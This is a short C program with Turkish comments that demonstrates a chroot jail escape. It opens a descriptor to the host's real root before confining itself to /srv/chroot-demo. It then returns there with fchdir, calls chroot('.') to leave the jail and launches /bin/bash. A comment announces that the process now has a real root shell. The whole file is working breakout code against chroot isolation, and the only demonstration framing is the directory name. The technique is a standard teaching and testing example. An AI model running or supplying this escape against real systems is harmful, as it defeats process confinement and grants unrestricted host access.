#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

int main() {
    // 1. chroot uygulanmadan önce host üzerindeki gerçek root'a bir fd (file descriptor) aç
    int real_root_fd = open("/", O_RDONLY);

    // 2. Süreci chroot ile sınırlandır
    chroot("/srv/chroot-demo");

    // 3. Önceden açtığımız fd'yi kullanarak gerçek root dizinine fchdir ile geç
    fchdir(real_root_fd);

    // 4. Göreceli dizini kullanarak chroot sınırlarının dışına çık
    chroot(".");

    // 5. Artık gerçek root shell'e erişimimiz var!
    execl("/bin/bash", "bash", NULL);
    return 0;
}
